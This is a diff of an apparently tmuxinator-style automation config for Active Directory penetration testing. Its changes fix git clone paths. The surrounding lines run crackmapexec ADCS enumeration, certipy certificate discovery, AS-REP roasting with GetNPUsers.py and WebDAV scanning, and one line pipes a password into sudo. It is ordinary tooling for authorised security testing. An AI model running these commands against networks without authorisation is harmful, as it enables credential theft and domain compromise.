@@ -94,7 +94,7 @@ windows:
           - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs | tee mkdir -p <%= @settings["rootDir"] %>/loot/ADCS/cme-ADCS.txt
         - certipy:
           - tmux select-pane -T 'certipy' -t "authd:ADCS.1"
-          - cd /opt/nomad-tools/Certipy-Docker || (git clone https://github.com/secure-77/Certipy-Docker.git && cd /opt/nomad-tools/Certipy-Docker)
+          - cd /opt/nomad-tools/Certipy-Docker || (git clone https://github.com/secure-77/Certipy-Docker.git /opt/nomad-tools/Certipy-Docker && cd /opt/nomad-tools/Certipy-Docker)
           - docker build -t certipy:latest .
           - docker run -it -v <%= @settings["rootDir"] %>/loot/ADCS:/tmp certipy:latest certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -output /tmp/<%= @settings["user"] %> -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/<%= @settings["user"] %>-certipyTee.txt
   - coercAuth: 
@@ -134,7 +134,7 @@ windows:
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERNAMEFILE.txt -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear
         - webdavScan:
           - tmux select-pane -T 'webdavScan' -t "authd:misc.3"
-          - cd /opt/nomad-tools/WebclientServiceScanner || (git clone https://github.com/Hackndo/WebclientServiceScanner.git WebclientServiceScanner && cd /opt/nomad-tools/WebclientServiceScanner)
+          - cd  /opt/nomad-tools/WebclientServiceScanner || (git clone https://github.com/Hackndo/WebclientServiceScanner.git  /opt/nomad-tools/WebclientServiceScanner && cd  /opt/nomad-tools/WebclientServiceScanner)
           - echo <%= @settings['nomadPass'] %> | sudo -S su
           - sudo python3 setup.py install
           - for IP in $(cat <%= @settings["rootDir"] %>/ipList.txt); do webclientservicescanner -dc-ip `cat /RSM/dcIP.txt | head -n 1` '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>@'$IP
